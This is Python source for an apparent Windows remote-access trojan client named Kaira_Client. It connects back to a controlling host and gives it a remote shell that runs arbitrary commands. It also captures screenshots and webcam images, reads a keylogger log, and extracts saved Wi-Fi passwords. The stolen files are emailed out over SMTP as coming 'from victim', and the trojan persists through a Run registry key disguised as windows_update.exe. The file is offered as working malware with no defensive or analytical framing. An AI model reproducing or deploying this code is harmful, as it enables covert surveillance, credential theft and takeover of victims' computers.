import socket
import subprocess
import os
import threading
from shutil import copyfile
from sys import executable, _MEIPASS
from pyautogui import screenshot
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import public_ip
from cv2 import VideoCapture, imwrite
from time import sleep
from modules import key




class Kaira_Client():
    def __init__(self):
        self.connection = socket.socket()
        self.connection.connect((host, port))
        try:
            self.public_ip_address = public_ip.get()
        except:
            self.public_ip_address = "undefined"

        self.screenshot_location = os.environ["appdata"] + "\\windows_screen.png"
        self.camera_location = os.environ["appdata"] + "\\windows_update.png"
        self.key_file = key.key_file
        self.persistence_file = os.environ["appdata"] + "\\windows_update.exe"
        self.wifi_file = os.environ["appdata"] + "\\windows_error.txt"

        self.smtp_ = self.connection.recv(5).decode()
        if self.smtp_ == "false":
            self.smtp_ = False
        else:
            self.smtp_creds = self.connection.recv(1024).decode()
            self.smtp_creds = self.smtp_creds.split("  ")
            self.smtp_email = self.smtp_creds[0]
            self.smtp_address = self.smtp_creds[1]
            self.smtp_port = self.smtp_creds[2]
            self.smtp_pass = self.smtp_creds[3]
            try:
                self.server = smtplib.SMTP(self.smtp_address, self.smtp_port)
                self.server.login(self.smtp_email, self.smtp_pass)
                self.smtp_ = True
                self.connection.send("SMTP true".encode())
            except:
                self.connection.send("SMTP false".encode())
                return None
        
        computer_name = socket.gethostname()
        self.connection.send(computer_name.encode())



    def download_file(self, file_name):
        self.server.login(self.smtp_email, self.smtp_pass)
        from_addr = self.smtp_email
        to_addr = from_addr
        if self.command == "screenshot":
            subject = f"Screenshot from {self.public_ip_address}"
            content = "Here is the downloaded screenshot from victim."
        elif self.command == "camera_snapshot":
            subject = f"Camera snapshot from {self.public_ip_address}"
            content = "Here is the downloaded camera snapshot from victim."
        elif self.command == "get_keys":
            subject = f"Keys from {self.public_ip_address}"
            content = "Here is the downloaded keys from victim."
        else:
            subject = f"{file_name} from {self.public_ip_address}"
            content = "Here is the downloaded file from victim."
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        body = MIMEText(content, "plain")
        msg.attach(body)
        with open(file_name, "rb") as file:
            attachment = MIMEApplication(file.read(), Name=os.path.basename(file_name))
            attachment['Content-Disposition'] = 'attachment; file_name="{}"'.format(os.path.basename(file_name))
        
        msg.attach(attachment)
        self.server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])

    def get_persistence(self):
        reg_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d " + self.persistence_file
        if not os.path.exists(self.persistence_file):
            copyfile(executable, self.persistence_file)
            subprocess.call(reg_command, shell=True)

    def remove_persistence(self):
        if os.path.exists(self.persistence_file):
            regedit_command = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /f"
            subprocess.call(regedit_command, shell=True)
            os.remove(self.persistence_file)

    def get_wifi(self):
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True)
        data = meta_data.decode('utf-8', errors ="backslashreplace")
        data = data.split('\n')
        profiles = []
        for i in data:
            if "All User Profile" in i :
                i = i.split(":")
                i = i[1]
                i = i[1:-1]
                profiles.append(i)
        file = open(self.wifi_file, "w")
        file.write("{:<30}| {:<}\n".format("Wi-Fi Name", "Password"))
        file.write("----------------------------------------------\n")
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
            results = results.decode('utf-8', errors ="backslashreplace")
            results = results.split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                file.write("{:<30}| {:<}\n".format(i, results[0]))
            except IndexError:
                file.write("{:<30}| {:<}\n".format(i, ""))
            
        file.close()
        

    def shell(self):
        while True:
            shell_command = self.connection.recv(16777216).decode()
            shell_command = shell_command.split(" ")
            if shell_command[0] == "cd" and len(shell_command) > 1:
                try:
                    os.chdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory changed to:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]Directory changing failed."
            elif shell_command[0] == "pwd":
                self.shell_command_output = os.getcwd()
            elif shell_command[0] == "mkdir" and len(shell_command) > 1:
                try:
                    os.mkdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory created successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]Directory creation failed."
            elif shell_command[0] == "rmdir" and len(shell_command) > 1:
                try:
                    os.rmdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory removed successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]Directory removing failed."
            elif shell_command[0] == "rm" and len(shell_command) > 1:
                try:
                    os.remove(shell_command[1])
                    self.shell_command_output = f"[+]File removed successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]File removing failed."
            elif shell_command[0] == "rename" and len(shell_command) > 2:
                try:
                    os.rename(shell_command[1], shell_command[2])
                    self.shell_command_output = f"[+]Directory renamed successfully:{shell_command[1]} -----> {shell_command[2]}"
                except:
                    self.shell_command_output = "[-]Directory renaming failed."
            elif shell_command[0] == "download" and len(shell_command) > 1:
                try:
                    self.download_file(shell_command[1])
                    self.shell_command_output = f"[+]{shell_command[1]} uploaded to SMTP, check your email inbox."
                except:
                    self.shell_command_output = "[-]File downloading failed."
            elif shell_command[0] == "exit":
                return 0
            else:
                try:
                    self.shell_command_output = subprocess.check_output(shell_command, shell=True, encoding='Latin1')
                except:
                    self.shell_command_output = "[-]Command executing failed."
            self.connection.send(self.shell_command_output.encode())



    def core(self):
        while True:
            self.command = self.connection.recv(16777216).decode()

            if self.command == "shell":
                self.shell()

            elif self.command == "screenshot":
                try:
                    self.screenshot_ = screenshot()
                    self.screenshot_.save(self.screenshot_location)
                    self.connection.send("[+]Screenshot taken successfully.".encode())
                except:
                    self.connection.send("[-]Screenshot can not be taken...".encode())
                try:
                    self.download_file(self.screenshot_location)
                    self.connection.send("[+]Screenshot sent with SMTP.".encode())
                except:
                    self.connection.send("[-]Screenshot didn't sent....".encode())

            elif self.command == "camera_snapshot":
                camera = VideoCapture(0)
                result, image = camera.read()
                if result:
                    imwrite(self.camera_location, image)
                    self.connection.send("[+]Camera snapshot taken...".encode())
                    try:
                        self.download_file(self.camera_location)
                        self.connection.send("[+]Camera snapshot sent with SMTP.".encode())
                    except:
                        self.connection.send("[-]Camera snapshot didn't sent....".encode())
                else:
                    self.connection.send("[-]Can't access the camera.".encode())

            elif self.command == "read_keys":
                try:
                    with open(self.key_file, "r", encoding="utf-8") as keys:
                        log = keys.read()
                    self.connection.send(log.encode())
                except:
                    self.connection.send("[-]Log file can't read.".encode())

            elif self.command == "get_keys":
                try:
                    self.download_file(self.key_file)
                    self.connection.send("[+]Log file sent with SMTP.".encode())
                except:
                    self.connection.send("[-]Log file didn't sent....".encode())

            elif self.command == "persistence":
                    try:
                        self.get_persistence()
                        self.connection.send("[+]Persistence activated.      ".encode())
                    except:
                        self.connection.send("[-]Persistence isn't activated.".encode())
            
            elif self.command == "remove_persistence":
                try:
                    self.remove_persistence()
                    self.connection.send("[+]Persistence deactivated.      ".encode())
                except:
                    self.connection.send("[-]Persistence isn't deactivated.".encode())

            elif self.command == "get_wifi":
                try:
                    self.get_wifi()
                    with open(self.wifi_file, "r", encoding="utf-8") as file:
                        wifi_ = file.read()
                    self.connection.send(wifi_.encode())
                except:
                    self.connection.send("[-]Can't get wifi creds.".encode())

            elif self.command == "system_info":
                system_info = subprocess.check_output("systeminfo", shell=True).decode("Latin1")
                self.connection.send(system_info.encode())

            elif self.command == "exit":
                self.connection.close()
                return 0


key_thread = threading.Thread(target=key.core_key)
key_thread.start()


def get_persistence():
    persistence_file = os.environ["appdata"] + "\\windows_update.exe"
    reg_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d " + persistence_file
    if not os.path.exists(persistence_file):
        copyfile(executable, persistence_file)
        subprocess.call(reg_command, shell=True)


